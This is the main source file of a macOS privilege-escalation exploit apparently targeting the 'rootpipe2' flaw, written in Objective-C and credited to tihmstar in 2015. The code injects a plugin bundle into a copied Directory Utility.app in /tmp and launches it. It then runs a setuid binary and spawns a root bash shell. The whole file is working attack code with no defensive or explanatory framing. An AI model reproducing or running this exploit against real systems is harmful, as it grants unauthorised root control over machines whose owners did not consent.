//
//  main.m
//  rootpipt2_exploit
//
//  Created by tihmstar on 06.07.15.
//  Copyright Â© 2015 tihmstar. All rights reserved.
//

#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSString *selfpath = NSProcessInfo.processInfo.arguments[0];
        NSString *newPath = @"/tmp/rpe_x";
        NSString *prepPath = @"/tmp/rpe_y";
        
        NSString *bundlepath = [[selfpath substringToIndex:[selfpath rangeOfString:@"/" options:NSBackwardsSearch].location +1]stringByAppendingString:@"rootpipe2_exploit_bundle.daplug"];
        
        //try
        if (!setuid(0)) {
            printf("Exploit succeeded, poping root shell\n");
            system("/bin/bash\n");
            [[NSFileManager defaultManager] removeItemAtPath:newPath error:nil];
            return 0;
        }
        printf("Running rootpipe2 exploit\n");
        
        
        printf("Preparing self\n");
        [[NSFileManager defaultManager] copyItemAtPath:selfpath toPath:prepPath error:nil];
        if (![[NSFileManager defaultManager] fileExistsAtPath:prepPath]) {
            printf("[Error] failed to copy self to prepPaath\n");
            return -1;
        }
        
        printf("moving Directory Utility.app to /tmp \n");
        [[NSFileManager defaultManager] copyItemAtPath:@"/System/Library/CoreServices/Applications/Directory Utility.app" toPath:@"/tmp/rpedu.app" error:nil];
        if (![[NSFileManager defaultManager] fileExistsAtPath:@"/tmp/rpedu.app"]) {
            printf("[Error] failed to copy rpedu to tmp\n");
            return -1;
        }
        
        printf("injecting bundle \n");
        [[NSFileManager defaultManager] copyItemAtPath:bundlepath toPath:@"/tmp/rpedu.app/Contents/PlugIns/rootpipe2_exploit_bundle.daplug" error:nil];
        if (![[NSFileManager defaultManager] fileExistsAtPath:@"/tmp/rpedu.app/Contents/PlugIns/rootpipe2_exploit_bundle.daplug"]) {
            printf("[Error] failed to inject bundle\n");
            return -1;
        }
        
        printf("running Directory Utility.app\n");
        
        NSString* rpedu = @"/tmp/rpedu.app/Contents/MacOS/Directory Utility";
       
        NSTask *task = [[NSTask alloc] init];
        [task setLaunchPath:rpedu];
        [task setStandardInput:[NSPipe pipe]];
        [task launch];
        
        while (task.running) {
            usleep(USEC_PER_SEC*0.01);
        }
        
        printf("cleaning up\n");
        [[NSFileManager defaultManager] removeItemAtPath:@"/tmp/rpedu.app" error:nil];
        if ([[NSFileManager defaultManager] fileExistsAtPath:@"/tmp/rpedu.app"]) {
            printf("[Warning] failed to clean up /tmp/rpedu.app\n");
        }
        
        [[NSFileManager defaultManager] removeItemAtPath:prepPath error:nil];
        if ([[NSFileManager defaultManager] fileExistsAtPath:prepPath]) {
            printf("[Warning] failed to clean up %@\n",prepPath);
        }
        printf("running suid binary\n");
        system([newPath UTF8String]);
    }
    return 0;
}
